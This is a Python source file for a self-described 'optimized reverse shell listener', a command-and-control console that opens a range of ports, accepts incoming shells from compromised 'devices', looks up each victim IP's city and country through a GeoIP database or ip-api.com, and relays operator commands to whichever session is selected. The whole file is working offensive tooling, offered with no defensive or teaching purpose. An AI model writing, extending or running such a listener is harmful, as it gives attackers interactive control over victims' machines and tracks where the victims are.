#!/usr/bin/env python3
"""
Optimized Reverse Shell Listener
Listens on a smaller port range to reduce lag
"""

import socket
import threading
import sys
import time
import json
import os
import signal
from datetime import datetime
import geoip2.database
import geoip2.errors
import requests

# ==================== ANSI COLORS ====================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

# ==================== OPTIMIZED LISTENER ====================
class OptimizedListener:
    def __init__(self, base_port=60000, max_ports=10):
        """
        Only listen on base_port to base_port+max_ports
        Dynamically expand as needed
        """
        self.base_port = base_port
        self.max_ports = max_ports
        self.active_ports = {}  # port -> thread
        self.port_lock = threading.Lock()
        self.next_port = base_port
        self.devices = {}
        self.next_id = 1
        self.current_id = None
        self.running = True
        self.geoip = self.setup_geoip()
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}║     🚀 OPTIMIZED REVERSE SHELL LISTENER                   ║{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}║         Dynamic port allocation - NO LAG                  ║{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
        print(f"\n{Colors.BOLD}Configuration:{Colors.END}")
        print(f"  Base Port: {self.base_port}")
        print(f"  Initial Ports: {self.base_port}-{self.base_port + self.max_ports - 1}")
        print(f"  Dynamic Expansion: ✓")
        print(f"  Type '{Colors.CYAN}help{Colors.END}' for commands\n")
    
    def setup_geoip(self):
        """Initialize GeoIP"""
        try:
            return GeoIPManager()
        except:
            return None
    
    def add_port_listener(self, port):
        """Add a listener for a specific port"""
        with self.port_lock:
            if port in self.active_ports:
                return
            
            def listen_port(p):
                try:
                    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    server.bind(('0.0.0.0', p))
                    server.listen(5)
                    
                    print(f"{Colors.GREEN}  ✓ Listening on port {p}{Colors.END}")
                    
                    while self.running:
                        try:
                            client, addr = server.accept()
                            thread = threading.Thread(
                                target=self.handle_device,
                                args=(client, addr, p)
                            )
                            thread.daemon = True
                            thread.start()
                        except:
                            pass
                except:
                    print(f"{Colors.RED}  ✗ Failed to listen on port {p}{Colors.END}")
            
            thread = threading.Thread(target=listen_port, args=(port,))
            thread.daemon = True
            thread.start()
            self.active_ports[port] = thread
    
    def get_next_port(self):
        """Get next available port, expanding if needed"""
        with self.port_lock:
            port = self.next_port
            self.next_port += 1
            
            # Add listener for this port if we haven't already
            if port not in self.active_ports:
                self.add_port_listener(port)
            
            return port
    
    def handle_device(self, client_socket, addr, port):
        """Handle incoming device connection"""
        device_id = self.next_id
        self.next_id += 1
        
        # Create device object
        device = {
            'id': device_id,
            'ip': addr[0],
            'port': port,
            'socket': client_socket,
            'first_seen': datetime.now(),
            'last_seen': datetime.now(),
            'active': True,
            'os': 'Unknown',
            'commands': [],
            'notes': ''
        }
        
        # Get location
        if self.geoip:
            location = self.geoip.get_location(addr[0])
        else:
            location = {'country': 'Unknown', 'city': 'Unknown'}
        
        self.devices[device_id] = device
        
        print(f"\n{Colors.GREEN}📍 NEW DEVICE CONNECTED!{Colors.END}")
        print(f"{Colors.BOLD}{'═'*50}{Colors.END}")
        print(f"  ID:       {device_id}")
        print(f"  IP:       {addr[0]}")
        print(f"  Port:     {port}")
        print(f"  Location: {location.get('city', 'Unknown')}, {location.get('country', 'Unknown')}")
        print(f"{Colors.BOLD}{'═'*50}{Colors.END}")
        print(f"  Type 'list' to see all devices")
        print(f"  Type 'use {device_id}' to interact\n")
        
        try:
            while self.running:
                if self.current_id == device_id:
                    # Interactive session
                    prompt = f"\n{Colors.CYAN}device[{device_id}:{addr[0]}]>{Colors.END} "
                    cmd = input(prompt)
                    
                    if cmd.lower() == 'back':
                        self.current_id = None
                        continue
                    elif cmd.lower() == 'exit':
                        client_socket.send(b'exit\n')
                        break
                    elif cmd.lower() == 'info':
                        print(f"\n  ID: {device_id}")
                        print(f"  IP: {addr[0]}")
                        print(f"  Port: {port}")
                        print(f"  Commands: {len(device['commands'])}")
                    else:
                        try:
                            client_socket.send(cmd.encode() + b'\n')
                            device['commands'].append(cmd)
                            response = client_socket.recv(8192)
                            if response:
                                print(response.decode(), end='')
                        except:
                            break
                else:
                    time.sleep(0.1)
        except:
            pass
        finally:
            device['active'] = False
            client_socket.close()
    
    def list_devices(self):
        """Show all connected devices"""
        if not self.devices:
            return f"{Colors.YELLOW}No devices connected{Colors.END}"
        
        result = f"\n{Colors.BOLD}{'═'*70}{Colors.END}\n"
        result += f"{Colors.BOLD}{'ID':<4} {'IP':<16} {'Port':<8} {'Status':<10} {'Commands'}{Colors.END}\n"
        result += f"{Colors.BOLD}{'═'*70}{Colors.END}\n"
        
        for device in self.devices.values():
            marker = f"{Colors.GREEN}→{Colors.END} " if self.current_id == device['id'] else "  "
            status = f"{Colors.GREEN}● ACTIVE{Colors.END}" if device['active'] else f"{Colors.RED}○ OFFLINE{Colors.END}"
            result += f"{marker}{device['id']:<2} {device['ip']:<16} {device['port']:<8} {status:<10} {len(device['commands'])}\n"
        
        return result
    
    def command_loop(self):
        """Main command interface"""
        while self.running:
            try:
                cmd = input(f"{Colors.PURPLE}listener>{Colors.END} ").strip().lower()
                
                if cmd in ['exit', 'quit']:
                    self.running = False
                    break
                elif cmd in ['help', '?']:
                    print(f"""
{Colors.BOLD}Commands:{Colors.END}
  list              - Show connected devices
  use <id>          - Interact with device
  ports             - Show active listener ports
  stats             - Show statistics
  clear             - Clear screen
  exit              - Shutdown
                    """)
                elif cmd == 'list':
                    print(self.list_devices())
                elif cmd == 'ports':
                    print(f"\n{Colors.BOLD}Active Listener Ports:{Colors.END}")
                    for port in sorted(self.active_ports.keys()):
                        print(f"  {Colors.GREEN}✓{Colors.END} Port {port}")
                    print(f"  Total: {len(self.active_ports)} ports\n")
                elif cmd.startswith('use '):
                    try:
                        dev_id = int(cmd[4:])
                        if dev_id in self.devices and self.devices[dev_id]['active']:
                            self.current_id = dev_id
                            print(f"{Colors.GREEN}Switched to device {dev_id}{Colors.END}")
                        else:
                            print(f"{Colors.RED}Device not found or inactive{Colors.END}")
                    except:
                        print(f"{Colors.RED}Invalid device ID{Colors.END}")
                elif cmd == 'stats':
                    active = len([d for d in self.devices.values() if d['active']])
                    print(f"\n{Colors.BOLD}Statistics:{Colors.END}")
                    print(f"  Active Ports: {len(self.active_ports)}")
                    print(f"  Total Devices: {len(self.devices)}")
                    print(f"  Active Devices: {active}")
                    print(f"  Next Port: {self.next_port}\n")
                elif cmd == 'clear':
                    os.system('clear' if os.name == 'posix' else 'cls')
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Use 'exit' to quit{Colors.END}")
    
    def start(self):
        """Start the listener"""
        # Start with initial port range
        for port in range(self.base_port, self.base_port + self.max_ports):
            self.add_port_listener(port)
        
        print(f"\n{Colors.GREEN}✓ Listening on ports {self.base_port}-{self.base_port + self.max_ports - 1}{Colors.END}")
        print(f"{Colors.YELLOW}More ports will be added automatically as needed{Colors.END}\n")
        
        # Start command loop
        self.command_loop()

# ==================== GEOIP MANAGER ====================
class GeoIPManager:
    def __init__(self):
        self.db_reader = None
        self.load_database()
    
    def load_database(self):
        try:
            import geoip2.database
            if os.path.exists('./GeoLite2-City.mmdb'):
                self.db_reader = geoip2.database.Reader('./GeoLite2-City.mmdb')
        except:
            pass
    
    def get_location(self, ip):
        if self.db_reader:
            try:
                response = self.db_reader.city(ip)
                return {
                    'country': response.country.name,
                    'city': response.city.name
                }
            except:
                pass
        
        # Fallback to API
        try:
            r = requests.get(f'http://ip-api.com/json/{ip}', timeout=2)
            if r.status_code == 200:
                data = r.json()
                return {
                    'country': data.get('country', 'Unknown'),
                    'city': data.get('city', 'Unknown')
                }
        except:
            pass
        
        return {'country': 'Unknown', 'city': 'Unknown'}

# ==================== MAIN ====================
if __name__ == "__main__":
    listener = OptimizedListener(base_port=60000, max_ports=10)
    
    def signal_handler(sig, frame):
        print(f"\n{Colors.YELLOW}Shutting down...{Colors.END}")
        listener.running = False
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    listener.start()
